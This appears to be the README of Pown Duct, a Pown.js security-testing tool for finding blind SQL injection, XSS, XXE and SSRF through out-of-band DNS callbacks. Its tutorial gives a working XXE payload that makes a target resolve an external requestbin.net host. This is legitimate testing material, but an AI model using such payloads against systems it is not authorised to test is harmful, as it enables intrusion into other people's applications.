[![Follow on Twitter](https://img.shields.io/twitter/follow/pownjs.svg?logo=twitter)](https://twitter.com/pownjs)
[![NPM](https://img.shields.io/npm/v/@pown/duct.svg)](https://www.npmjs.com/package/@pown/duct)
[![Fury](https://img.shields.io/badge/version-2x%20Fury-red.svg)](https://github.com/pownjs/lobby)

# Pown Duct

Essential tool for finding blind injection attacks.

## Credits

This tool is part of [secapps.com](https://secapps.com) open-source initiative.

```
  ___ ___ ___   _   ___ ___  ___
 / __| __/ __| /_\ | _ \ _ \/ __|
 \__ \ _| (__ / _ \|  _/  _/\__ \
 |___/___\___/_/ \_\_| |_|  |___/
  https://secapps.com
```

> **NB**: This tool is taking advantage of http://requestbin.net service. Future versions will use a dedicated, custom-built infrastructure.

## Quickstart

This tool is meant to be used as part of [Pown.js](https://github.com/pownjs/pown) but it can be invoked separately as an independent tool.

Install Pown first as usual:

```sh
$ npm install -g pown@latest
```

Invoke directly from Pown:

```sh
$ pown duct
```

Otherwise, install this module locally from the root of your project:

```sh
$ npm install @pown/duct --save
```

Once done, invoke pown cli:

```sh
$ ./node_modules/.bin/pown-cli duct
```

You can also use the global pown to invoke the tool locally:

```sh
$ POWN_ROOT=. pown duct
```

## Usage

```
pown duct <command>

Side-channel attack enabler

Commands:
  pown duct dns  DNS ducting

Options:
  --version  Show version number  [boolean]
  --help     Show help  [boolean]
```

### `pown duct dns`

```
pown duct dns

DNS ducting

Options:
  --version  Show version number  [boolean]
  --help     Show help  [boolean]
  --channel  Restore channel  [string]
  --output   Output format  [string] [choices: "string", "hexdump", "json"] [default: "string"]
```

## Tutorial

There are cases when we need to perform an attack such as sql injection, XSS, XXE or SSRF but the target application is not providing any indication that it is vulnerable. One way to be sure if a vulnerability is present is to try to inject a valid attack vector which forces a DNS resolver to ask for an attack controlled domain. If the resolution is successful, the attack will be considered successful.

> **NOTE**: You might be familiar with Burp Collaborator which provides a similar service for customers.

First, we need a disposable dns name to resolve:

```sh
$ pown duct dns
```

![screenshot](https://media.githubusercontent.com/media/pownjs/pown-duct/master/screenshots/01.png)

Using the provided DNS, compose your payload. For example, the following could trigger trigger a DNS resolution if a XXE vulnerability is present.

```xml
<!DOCTYPE foo [
<!ELEMENT foo ANY>
<!ENTITY bar SYSTEM "http://showmethemoney.bfa8b8d3c25f09d5429f.d.requestbin.net">
]>
<foo>
&bar;
</foo>
```

If the attack was successful, we will get a message in the terminal.

![screenshot](https://media.githubusercontent.com/media/pownjs/pown-duct/master/screenshots/02.png)
